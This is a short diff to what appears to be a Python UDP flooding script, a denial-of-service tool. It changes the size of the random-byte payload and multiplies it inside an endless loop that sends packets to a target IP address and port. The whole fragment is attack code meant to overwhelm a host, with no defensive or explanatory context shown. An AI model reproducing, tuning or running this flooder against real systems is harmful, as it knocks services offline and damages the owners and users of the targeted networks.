@@ -30,7 +30,7 @@ year = now.year
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-bytes = random._urandom(500000)
+bytes = random._urandom(10000)
 
 #############
 
@@ -86,7 +86,7 @@ sent = 0
 
 while True:
 
-     sock.sendto(bytes, (ip,port))
+     sock.sendto(bytes*10, (ip,port))
 
      sent = sent + 1
 
